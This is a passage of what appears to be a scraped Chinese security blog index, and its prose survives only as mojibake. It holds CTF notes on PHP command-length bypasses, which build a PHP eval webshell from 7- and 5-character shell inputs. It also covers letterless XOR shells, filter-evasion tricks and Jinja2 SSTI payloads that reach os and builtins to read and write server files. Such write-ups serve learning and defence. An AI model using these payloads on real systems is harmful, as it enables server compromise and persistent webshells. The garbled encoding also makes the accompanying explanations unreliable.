å†™å…¥åèšå‰‘è¿æ¥é¶æœº æ‹¿åˆ°flag 7ä½å¯æ§&lt;?php highlight_file(__FILE__); if (strlen($_GET[1])&lt;=7){ echo strlen($_GET[1]); echo '&lt;hr/&gt;'; echo shell_exec($_GET[1]); }else{ exit(\"too long~\"); } å°çŸ¥è¯†ç‚¹ &gt;a #è™½ç„¶æ²¡æœ‰è¾“å‡ºä½†æ˜¯ä¼šåˆ›å»ºaè¿™ä¸ªæ–‡ä»¶ ls -s #lsåŸºäºäº‹ä»¶æ’åºï¼ˆä»æ™šåˆ°æ—©ï¼‰ sh a #shä¼šæŠŠaé‡Œé¢çš„æ¯è¡Œå†…å®¹å½“ä½œå‘½ä»¤æ¥æ‰§è¡Œ ä½¿ç”¨\\è¿›è¡Œå‘½ä»¤æ‹¼æ¥ #l\\s=ls base64 #ä½¿ç”¨base64ç¼–ç é¿å…ç‰¹æ®Šå­—ç¬¦ ç›®æ ‡å†™å…¥ä¸€å¥è¯æœ¨é©¬ &lt;?php eval($_GET[1]); base64ç¼–ç å PD9waHAgZXZhbCgkX0dFVFsxXSk7 æˆ‘ä»¬éœ€è¦æ‰§è¡Œ echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php payload: &gt;hp &gt;1.p\\\\ &gt;d\\&gt;\\\\ &gt;\\ -\\\\ &gt;e64\\\\ &gt;bas\\\\ &gt;7\\|\\\\ &gt;XSk\\\\ &gt;Fsx\\\\ &gt;dFV\\\\ &gt;kX0\\\\ &gt;bCg\\\\ &gt;XZh\\\\ &gt;Agz\\\\ &gt;waH\\\\ &gt;PD9\\\\ &gt;o\\ \\\\ &gt;ech\\\\ ls -t&gt;0 sh 0 5ä½å¯æ§&lt;?php $sandbox='/var/www/html/sandbox'.md5(\"orange\".$_SERVER); $_SERVER($sandbox); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd'])&amp;&amp;strlen($_GET['cmd'])&lt;=5){ @exec($_GET['cmd']); }else if (isset($_GET['reset'])){ @exec('/bin/rm -rf'.$sandbox); } highlight_file(__FILE__); ?&gt; çŸ¥è¯†ç‚¹ï¼š 1.è¾“å…¥é€šé…ç¬¦* ,Linuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“åšå‘½ä»¤,å‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•° 2.é€šè¿‡revæ¥å€’ç½®è¾“å‡ºå†…å®¹(revå‘½ä»¤å°†æ–‡ä»¶ä¸­çš„æ¯è¡Œå†…å®¹ä»¥å­—ç¬¦ä¸ºå•ä½ååºè¾“å‡º) 3.ç”¨diræ¥ä»£æ›¿lsä¸æ¢è¡Œè¾“å‡º;revå°†æ–‡ä»¶å†…å®¹åå‘è¾“å‡º;åœ¨ç”¨lsæ˜¯,å†™åˆ°aæ—¶æ¯ä¸ªæ–‡ä»¶åéƒ½æ˜¯å•ç‹¬ä¸€è¡Œ &gt;rev echo '1233'&gt;v *v (ç­‰åŒäºå‘½ä»¤:rev v) æˆ‘ä»¬éœ€è¦æŠŠ echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php æ‹†åˆ†ç„¶åæ‰§è¡Œ payload &gt;dir &gt;f\\&gt; &gt;ht- &gt;sl *&gt;v &gt;rev *v&gt;a &gt;hp &gt;p\\\\ &gt;1.\\\\ &gt;\\&gt;\\\\ &gt;-d\\\\ &gt;\\\\\\ &gt;64\\\\ &gt;se\\\\ &gt;ba\\\\ &gt;\\|\\\\ &gt;7\\\\ &gt;Sk\\\\ &gt;X\\\\ &gt;x\\\\ &gt;Fs\\\\ &gt;FV\\\\ &gt;d\\\\ &gt;X0\\\\ &gt;k\\\\ &gt;g\\\\ &gt;bC\\\\ &gt;h\\\\ &gt;XZ\\\\ &gt;gZ\\\\ &gt;A\\\\ &gt;aH\\\\ &gt;w\\\\ &gt;D9\\\\ &gt;P\\\\ &gt;S}\\\\ &gt;IF\\\\ &gt;{\\\\ &gt;\\$\\\\ &gt;o\\\\ &gt;ch\\\\ &gt;e\\\\ sh a sh f æ— å­—æ¯shellå¼‚æˆ–æœ‰çš„æ—¶å€™ä¼šé‡åˆ°è¿™æ ·çš„æƒ…å†µï¼š &lt;?php error_reporting(0); highlight_file(__FILE__); if(!preg_match('/[a-z0-9]',$_GET['h3'])){ eval($_GET[h3]); } è¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯ è¿™é‡Œä»¬å¯ä»¥ç”¨åˆ°å¼‚æˆ– &lt;?php echo \".\"^\"~\"; è¾“å‡ºç»“æœä¸ºï¼š P PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–çš„æ—¶å€™ï¼Œä¼šå…ˆå°†æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆASCIIå€¼ï¼Œå†è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚ å–å1ã€äºŒè¿›åˆ¶çš„æœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œ0è¡¨ç¤ºæ­£æ•°ï¼Œ1è¡¨ç¤ºé™„å± 2ã€æ­£æ•°çš„åŸç ï¼Œåç ï¼Œè¡¥ç éƒ½æ˜¯ç›¸åŒ 3ã€è´Ÿæ•°çš„åç =å®ƒçš„åŸç çš„ç¬¦å·ä½ä¸å˜ï¼Œå…¶å®ƒä½å–åï¼ˆ0-&gt;1,1-&gt;0ï¼‰ 4ã€è´Ÿæ•°çš„è¡¥ç =å®ƒçš„åç +1 5ã€0çš„åç ã€è¡¥ç éƒ½æ˜¯0 6ã€PHPæ²¡æœ‰æ— ç¬¦å·æ•° 7ã€åœ¨è®¡ç®—æœºè¿ç®—çš„æ—¶å€™ï¼Œéƒ½æ˜¯ä»¥è¡¥ç çš„æ–¹å¼æ¥è¿ç®—ï¼Œé‚£ä¹ˆè¿ç®—çš„ç»“æœä¹Ÿæ˜¯æŸä¸ªæ•°çš„è¡¥ç  &lt;?php echo urlencode(~\"phpinfo\"); #%8F%97%8F%96%91%99%90 è‡ªå¢##é€šé…ç¬¦ ä½¿ç”¨``åå¼•å·+â€shellâ€çš„æ–¹å¼æ¥getshell shellä¸‹å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬ .æˆ–è€…å«periodï¼Œä»–çš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™.fileçš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ globé€šé…ç¬¦ *å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦ ?å¯ä»¥ä»£è¡¨ä¸€ä¸ªä»»æ„å­—ç¬¦ ç”¨[^x]çš„æ–¹æ³•æ¥æ„é€ â€è¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ [0-9]æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ https://man7.org/linux/man-pages/man7/glob.7.html è¿™é‡Œæœ‰globçš„æ›´å¤šå†…å®¹ å‘½ä»¤æ‰§è¡Œç»•è¿‡Linuxå‘½ä»¤1.æŸ¥çœ‹æ–‡ä»¶ å‘½ä»¤ ä½œç”¨ cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º tac ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º more æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ–‡ä»¶ less å’Œmoreç´¯æ­»ï¼Œä½†æ˜¯å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”å¯ä»¥æœç´¢å­—ç¬¦ head åªæ˜¾ç¤ºå¤´å‡ è¡Œ tail åªæ˜¾ç¤ºæœ€åå‡ è¡Œ nl ç´¯æ­»äºcat -nï¼Œæ˜¾ç¤ºçš„æ—¶å€™è¾“å‡ºè¡Œå· tailf ç±»ä¼¼äºtail -f od è¯»å–æ‰€ç»™äºˆçš„æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†å…¶å†…å®¹ä»¥å…«è¿›åˆ¶çš„å­—ç æ˜¾ç¤ºå‡ºæ¥ sort å°†æ–‡ä»¶å†…å®¹æ’åº rev å°†æ–‡ä»¶ä¸­çš„æ¯è¡Œå†…å®¹ä»¥å­—ç¬¦ä¸ºå•ä½ååºè¾“å‡º string æ‰“å°æ–‡ä»¶ä¸­å¯æ‰“å°çš„å­—ç¬¦ cut -f 1 filenameä»æ–‡ä»¶çš„æ¯ä¸€è¡Œå‰ªåˆ‡å­—èŠ‚ï¼Œå­—ç¬¦å’Œå­—æ®µå¹¶å°†è¿™äº›å­—èŠ‚ï¼Œå­—ç¬¦å’Œå­—æ®µå†™è‡³æ ‡å‡†è¾“å‡º 2.æŸ¥æ‰¾æ–‡ä»¶find . -name \"fla*\" locate fla* locate å‘½ä»¤æ— éœ€æŒ‡å®šè·¯å¾„ï¼Œç›´æ¥æœç´¢å³å¯ã€‚è¯¥å‘½ä»¤å®åœ¨mlocate.dbçš„æ•°æ®åº“ä¸‹æœç´¢ï¼Œè¿™ä¸ªæ•°æ®åº“ä½äº/var/lib/mlocate/mlocate.db å®ƒåŒ…å«äº†ç³»ç»Ÿä¸­æ‰€æœ‰æ–‡ä»¶çš„ç´¢å¼•ï¼Œå¹¶ä¸”ä¼šåœ¨æ¯å¤©æ—©ä¸Šçš„æ—¶å€™ç”±cronå·¥å…·è‡ªåŠ¨æ›´æ–°ä¸€æ¬¡ï¼Œå¯ä»¥sudo updadbæ›´æ–°å…¶æ•°æ®åº“ which å‘½ä»¤ä¸»è¦ç”¨æ¥æŸ¥è¯¢å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½® whereis å‘½ä»¤ä¼šåœ¨ç³»ç»Ÿé»˜è®¤å®‰è£…ç›®å½•ï¼ˆä¸€èˆ¬æ˜¯ç”¨rootæƒé™æ—¶é»˜è®¤å®‰è£…çš„è½¯ä»¶ï¼‰æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ã€æºç ã€æ–‡æ¡£ä¸­åŒ…å«ç»™å®šæŸ¥è¯¢å…³é”®è¯çš„æ–‡ä»¶ã€‚ 3.å¯»æ‰¾æ–‡ä»¶å†…å®¹grep -ar fla* / -aä¸å¿½ç•¥äºŒè¿›åˆ¶æ–‡ä»¶ 4.æ–‡ä»¶ä¼ è¾“curl åˆ©ç”¨curlä¸‹è½½æ–‡ä»¶ #ä½¿ç”¨å†…ç½®option: -o #curl -o dodo1.jpg http:www.linux.com/dodo1.JPG #ä½¿ç”¨å†…ç½®option: -O #curl -O http://www.linux.com/dodo1.jpg 5.å‘½ä»¤åˆ†éš”ç¬¦1.%0a ---&gt;æ¢è¡Œç¬¦ 2.%0d ---&gt;å›è½¦ç¬¦ 3.;ç¬¦å· å†shellä¸­ï¼Œæ‹…ä»»\"è¿ç»­æŒ‡ä»¤\"åŠŸèƒ½çš„ç¬¦å·å°±æ˜¯\"åˆ†å·\" 4.&amp;ç¬¦å·&amp;æ”¾åœ¨å¯åŠ¨å‚æ•°åé¢è¡¨ç¤ºè¯¥è¿›ç¨‹ä¸ºåå°è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿›ç¨‹æ˜¯å‰å°è¿›ç¨‹ï¼Œè¿™æ—¶ä¹å…«shellç»™å æ®äº†ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œå…¶ä»–æ“ä½œï¼Œå¯¹äºé‚£äº›æ²¡æœ‰äº¤äº’çš„è¿›ç¨‹ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒåœ¨åå°å¯åŠ¨ï¼Œå¯ä»¥åœ¨å¯åŠ¨å‚æ•°çš„æ—¶å€™åŠ ä¸€ä¸ª'&amp;'å®ç°è¿™ä¸ªç›®çš„ï¼Œè¿›ç¨‹åˆ‡æ¢åˆ°åå°çš„æ—¶å€™ï¼Œæˆ‘ä»¬æŠŠå®ƒæˆä¸ºjobï¼Œåˆ‡æ¢åˆ°åå°çš„æ—¶å€™ä¼šè¾“å‡ºç›¸å…³jobä¿¡æ¯ 5.|ç¬¦å·ï¼Œç®¡é“ç¬¦å·¦é¢å‘½ä»¤çš„è¾“å‡ºå°±ä½œä¸ºç®¡é“ç¬¦å³é¢å‘½ä»¤çš„è¾“å…¥ï¼Œæ‰€ä»¥å·¦è¾¹çš„è¾“å‡ºä¸æ˜¾ç¤º 6.&amp;&amp;è¡¨ç¤ºå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œæ‰æ‰§è¡Œåä¸€æ¡å‘½ä»¤ 7.||è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ 8.å‘½ä»¤ç»ˆæ­¢ç¬¦%00 %20 # 6.åˆ—ç›®å½•ls dir ç©ºæ ¼ç»•è¿‡$IFSåœ¨Linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œå•çº¯çš„cat$IFS2,bashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“ä½œå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“å‡ºä¸æ¥ç»“æœï¼Œç„¶åå¦‚æœåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ ${IFS} $IFS$9 &lt; &lt;&gt; {,} é»‘åå•è¿‡æ»¤1.æ‹¼æ¥a=c;b=at;c=flag;$a$b $c 2.base64ç¼–ç `echo \"Y2F0IGZsYWc=\"|base64 -d` echo \"Y2F0IGZsYWc=\"|base64 -d|bash 3.å•å¼•å·ã€åŒå¼•å·c\"\"at flag c''at flag ca\"\"t fl''ag ###4.åæ–œçº¿ \\ c\\at fl\\ag","categories":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"SStiåŸºç¡€å­¦ä¹ ","slug":"Pythonæ¨¡æ¿æ³¨å…¥(SSTI)åŸºç¡€","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T03:57:13.470Z","comments":true,"path":"posts/b0c48792.html","link":"","permalink":"http://h3geeker.top/posts/b0c48792.html","excerpt":"","text":"ä¸€ã€SSTiæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„æ¦‚å¿µSSTIæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥(Server-Side Template Injection)ï¼Œæˆ‘ä»¬å¸¸è§çš„æ³¨å…¥æœ‰æˆ‘ä»¬ç†Ÿæ‚‰çš„SQLæ³¨å…¥ï¼Œä¸¤è€…çš„ä¸é€šä¹‹å¤„å°±æ˜¯SSTIåˆ©ç”¨çš„æ˜¯ç°åœ¨çš„ç½‘ç«™æ¨¡æ¿å¼•æ“(ä¸‹é¢ä¼šæåˆ°)ï¼Œä¸»è¦é’ˆå¯¹pythonã€phpã€javaçš„ä¸€äº›ç½‘ç«™å¤„ç†æ¡†æ¶ï¼Œæ¯”å¦‚Pythonçš„jinja2 mako tornado djangoï¼Œphpçš„smarty twigï¼Œjavaçš„jade velocityï¼Œè€Œä¸¤è€…çš„ç›¸åŒéƒ¨åˆ†å°±æ˜¯å…ˆä»ç”¨æˆ·å¤„è·å¾—å€¼ä½œä¸ºwebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œç„¶åè¿›è¡Œç¼–è¯‘æ¸²æŸ“ï¼Œå¦‚æœåœ¨å…¶ä¸­ç”¨æˆ·æ’å…¥äº†æ¶æ„å†…å®¹ï¼Œå°±å¯èƒ½å¯¼è‡´ä¸€ç³»åˆ—çš„ä¸è‰¯åæœï¼Œæ¯”å¦‚RCEã€ä¿¡æ¯æ³„éœ²ã€getshellç­‰ç­‰ï¼ˆå‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹éƒ½å¯èƒ½ä¼šå‡ºç° SSTI çš„é—®é¢˜ï¼ŒSSTI ä¸å±äºä»»ä½•ä¸€ç§è¯­è¨€ï¼Œæ²™ç›’ç»•è¿‡ä¹Ÿä¸æ˜¯ï¼Œæ²™ç›’ç»•è¿‡åªæ˜¯ç”±äºæ¨¡æ¿å¼•æ“å‘ç°äº†å¾ˆå¤§çš„å®‰å…¨æ¼æ´ï¼Œç„¶åæ¨¡æ¿å¼•æ“è®¾è®¡å‡ºæ¥çš„ä¸€ç§é˜²æŠ¤æœºåˆ¶ï¼Œä¸å…è®¸ä½¿ç”¨æ²¡æœ‰å®šä¹‰æˆ–è€…å£°æ˜çš„æ¨¡å—ï¼Œè¿™é€‚ç”¨äºæ‰€æœ‰çš„æ¨¡æ¿å¼•æ“ï¼Œæœ¬æ–‡é’ˆå¯¹Pythonåšä¸»è¦å­¦ä¹ ï¼‰ æœåŠ¡ç«¯-&gt;æ¨¡æ¿æ–‡ä»¶-&gt;æ¨¡æ¿å¼•æ“-&gt;ç”¨æˆ·ç«¯ äºŒã€FlaskåŸºç¡€å› ä¸ºå¸¸ç”¨åˆ°SSTiçš„ç½‘ç«™éƒ½æ˜¯Pythonçš„ç½‘ç«™ æ‰€ä»¥æˆ‘åœ¨è¿™é‡Œä¼šè®°å½•ä¸€ä¸‹Flaskçš„åŸºç¡€ï¼Œä»¥ä¾¿äºå­¦ä¹  1ã€Flaskç®€ä»‹ Flaskæ˜¯ä¸€ä¸ªPythonä¸Šçš„webåº”ç”¨æ¡†æ¶ webåº”ç”¨æ¡†æ¶æ˜¯ä¸€ä¸ªåº“å’Œæ¨¡å—çš„é›†åˆï¼Œä½¿webåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜èƒ½å¤Ÿç¼–å†™webåº”ç”¨ç¨‹åºï¼Œè€Œä¸å¿…æ‹…å¿ƒåè®®ï¼Œçº¿ç¨‹ç®¡ç†ç­‰ä½çº§ç»†èŠ‚ åŸºäºWerkzeug WSGIå·¥å…·ç®±å’ŒJinja2 æ¨¡æ¿å¼•æ“ Werkzeug æ˜¯ä¸€ä¸ª Python çš„ HTTP å’Œ WSGI å·¥å…·åº“ï¼Œå¯ä»¥æ–¹ä¾¿çš„åœ¨ Python ç¨‹åºä¸­å¤„ç† HTTP åè®®ç›¸å…³å†…å®¹ã€‚ åŠŸèƒ½åŒ…æ‹¬ï¼š HTTP header è§£æå’Œè¾“å‡º æ˜“ç”¨çš„ request å’Œ response å¯¹è±¡ äº¤äº’å¼ JavaScript çš„æµè§ˆå™¨è°ƒè¯•å™¨ 100% WSGI 1.0 å…¼å®¹ æ”¯æŒ Python 2.6, 2.7 å’Œ 3.3. æ”¯æŒ Unicode æ”¯æŒåŸºæœ¬çš„ session å’Œç­¾å cookie æ”¯æŒ unicode çš„ URI å’Œ IRI å·¥å…· å†…å»ºç”¨äºä¿®å¤ WSGI æœåŠ¡å™¨å’Œæµè§ˆå™¨ bug çš„åº“ é›†æˆ URL è·¯ç”± Jinja æ˜¯åŸºäºpythonçš„æ¨¡æ¿å¼•æ“ï¼ŒåŠŸèƒ½æ¯”è¾ƒç±»ä¼¼äºäºPHPçš„smartyï¼ŒJ2eeçš„Freemarkerå’Œvelocityã€‚ ç¤ºä¾‹ä»£ç ï¼š from flask import Flask, render_template_string app = Flask(__name__) @app.route(\"/\") def hello(): return render_template_string(\"Hello {{name}}\",name='world'); if __name__ == \"__main__\": app.run() (1).Jinjiaæ¨¡æ¿ç‰¹ç‚¹{{...}}:è£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“æ—¶ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°å˜é‡çš„ä»£è¡¨å€¼æ›¿æ¢ {%...%}:è£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ {#...#}:è£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼ (2).Jinja2ä¸­forå¾ªç¯çš„å†…ç½®å¸¸é‡ å¸¸é‡ è¯´æ˜ loop.index å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»0å¼€å§‹ï¼‰ loop.first æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›true or false loop.last æ˜¯å¦æ˜¯æœ€åä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›true or false loop.length åºåˆ—çš„é•¿åº¦ ä¸å¯ä»¥ä½¿ç”¨continueå’Œbreakè¡¨è¾¾å¼æ¥æ§åˆ¶å¾ªç¯çš„æ‰§è¡Œ (3).è¿‡æ»¤å™¨è¿‡æ»¤å™¨æ˜¯é€šè¿‡ç®¡é“ç¬¦|æ¥ä½¿ç”¨çš„ï¼Œä¾‹å¦‚{{name|length}}ï¼šæ¥è¿”å›nameçš„é•¿åº¦ è¿‡æ»¤å™¨æƒ³å½“äºä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå½“å‰çš„å˜é‡ä¼ å…¥åˆ°è¿‡æ»¤å™¨ä¸­ï¼Œç„¶åè¿‡æ»¤å™¨æ ¹æ®è‡ªå·±çš„åŠŸèƒ½ï¼Œå†è¿”å›ç›¸åº”çš„å€¼ç„¶åæŠŠç»“æœæ¸²æŸ“åˆ°é¡µé¢ä¸­ #ä¸‰ã€SSTiæ¼æ´çš„äº§ç”Ÿ ##1ã€æ¼æ´æˆå›  æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ å¦‚æœå†æ¸²æŸ“ä¹‹å‰ï¼Œå­˜åœ¨æ¥å—ç”¨æˆ·è¾“å…¥çš„æ“ä½œï¼Œå¹¶ä¸”æœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œå°±æœ‰å¯èƒ½é€ æˆSSTiæ¼æ´çš„äº§ç”Ÿ ä¸¾ä¸€ä¸ªä¾‹å­ï¼š from flask import Flask, render_template_string from flask.globals import request from jinja2 import Template app = Flask(__name__) @app.route(\"/\") def hello(): name = request.args.get('name','hack') info = Template(\"Hello \" + name) return info.render() if __name__ == \"__main__\": app.run() æºç ä¸­åœ¨æ¸²æŸ“å‰å°±å­˜åœ¨ç€æ¥å—ç”¨æˆ·è¾“å…¥çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯ä¸€ä¸‹æ˜¯å¦å¯ä»¥æ³¨å…¥ æˆ‘ä»¬ä¼ å…¥æµ‹è¯•payload å¯ä»¥çœ‹åˆ°æµ‹è¯•payloadè¢«æˆåŠŸæ‰§è¡Œ æ­¤æ—¶æˆ‘ä»¬å°±è¯æ˜æ¼æ´å­˜åœ¨ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿåœ¨è¿™ä¸ªæ³¨å…¥ç‚¹æ‰§è¡Œè¯¥æ¨¡æ¿å¼•æ“çš„æ§åˆ¶è¯­å¥å¯„å‘½ä»¤ Flask SSTiæ¼æ´çš„åŸºæœ¬æ€è·¯å°±æ˜¯åˆ©ç”¨Pythonä¸­çš„å„ç§é­”æœ¯æ–¹æ³•æ¥åˆ©ç”¨ å››ã€æ¼æ´åˆ©ç”¨ç”±äºåœ¨jinja2ä¸­æ˜¯å¯ä»¥ç›´æ¥è®¿é—®pythonçš„ä¸€äº›å¯¹è±¡åŠå…¶æ–¹æ³•çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ„é€ ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œç­‰ é­”æœ¯æ–¹æ³• è¯´æ˜ __dict__ ä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸ __class__ è¿”å›è°ƒç”¨çš„å‚æ•°ç±»å‹ __mro__ è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç´ ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æ __base__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±» __subclasses__ è¿”å›objectçš„å­ç±» __init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³• __globals__ å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹æ”¾å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ä¸func_globalsç­‰ä»· __bases__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„ç±»å‹åˆ—è¡¨ 1ã€åŸºæœ¬æ­¥éª¤###1.åŸºç¡€åˆ©ç”¨ ä½¿ç”¨é­”æœ¯æ–¹æ³•è¿›è¡Œå‡½æ•°è§£æï¼Œè·å–åŸºæœ¬ç±» ''.__class__.__mro__[2] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] è·å–åŸºæœ¬ç±»åï¼Œç»§ç»­è·å–åŸºæœ¬ç±»çš„objectçš„å­ç±» object.__subclasses__() è¿™é‡Œå¯èƒ½å­ç±»ä¸­å«æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œä¾‹å¦‚evalç­‰ ä¹Ÿå¯ä»¥åˆ©ç”¨æ¨¡æ¿æ§åˆ¶è¯­å¥ ä¾‹å¦‚è¿™æ ·ï¼š {%for c in ''.__class__.__base__.__subclasses__()%} {% if 'os' in c.__init__.__globals__%} {{loop.index0 ~'_'~c.__name__~'-'}} {% else %} {{ '-' }} {%endif%} {% endfor %} 2.åˆ©ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤ä¸Šé¢çš„å®ä¾‹ä¸­æˆ‘ä»¬ä½¿ç”¨diræŠŠå†…ç½®çš„å¯¹è±¡åˆ—ä¸¾å‡ºæ¥ï¼Œå…¶å®å¯ä»¥ç”¨__globals__æ›´æ·±å…¥çš„å»çœ‹æ¯ä¸ªç±»å¯ä»¥è°ƒç”¨çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬æ¨¡å—ï¼Œç±»ï¼Œå˜é‡ç­‰ç­‰ï¼‰ï¼Œå¦‚æœæœ‰osè¿™ç§å¯ä»¥ç›´æ¥ä¼ å…¥å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œ åˆ©ç”¨æ§åˆ¶è¯­å¥æ‰¾åˆ°å¯ç”¨çš„æ¨¡å—ï¼Œæˆ–è€…builtins {% for c in ''.__class__.__base__.__subclasses__() %} {% if '__builtins__' in c.__init__.__globals__%} {{loop.index0 ~'_'~c.__name__~'-'}} {% else %} {{ '-' }} {%endif%} {{''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']}} 2.ä¸€äº›å¸¸ç”¨çš„payload//è·å–åŸºæœ¬ç±» ''.__class__.__mro__[1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] object //è¯»æ–‡ä»¶ ().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read() object.__subclasses__()[40](r'C:\\1.php').read() //å†™æ–‡ä»¶ ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123') 